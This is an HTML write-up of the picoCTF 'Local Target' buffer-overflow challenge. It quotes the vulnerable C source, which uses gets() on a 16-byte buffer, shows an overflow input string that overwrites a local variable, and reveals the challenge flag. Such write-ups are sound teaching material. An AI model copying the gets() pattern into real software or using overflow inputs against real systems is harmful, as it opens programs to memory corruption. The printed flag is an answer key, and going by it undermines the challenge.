<title>Local Target- picogym Exclusive</title>

<!DOCTYPE html>
<html>

<body>
    <h1>Local Target- picogym Exclusive</h1>

    <h2>Challenge Description</h2>
    <p> 
AUTHOR: OVERTHEWIRE.ORG / LT 'SYREAL' JONES

Description
Smash the stack
Additional details will be available after launching your challenge instance.
instanc:Description
Smash the stack
Can you overflow the buffer and modify the other local variable? The program is available <a href="https://artifacts.picoctf.net/c/518/local-target">here</a>. You can view source <a href="https://artifacts.picoctf.net/c/518/local-target">here</a>. And connect with it using:
nc saturn.picoctf.net 51696(file and address can be  deffirent in different instances)

</p>

    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
we download files from picoctf
<p id="code1">
$wget https://artifacts.picoctf.net/c/518/local-target
$wget  https://artifacts.picoctf.net/c/518/local-target.c
</p>
open them and see code of source and see this intersting lines
<pre>

int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
   
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }
</pre>
it means buferoverflow and mean in this code if we enter <pre>12345678901234567890123AAAAAAAAAAAAAAAAAAAA(A 's count is different in on base of size of input</pre>
enter it and get code
</ol>
<br>
    <h2>Flag</h2>
    <p class="flag">picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
</p>

 
    <h2>Conclusion</h2>
    <p>this is a    easy chanllenge for work on reverse engineering on asm and $rbp and python and get dump file and watch rbp and memories value with gdb </p>
</body>
</html>











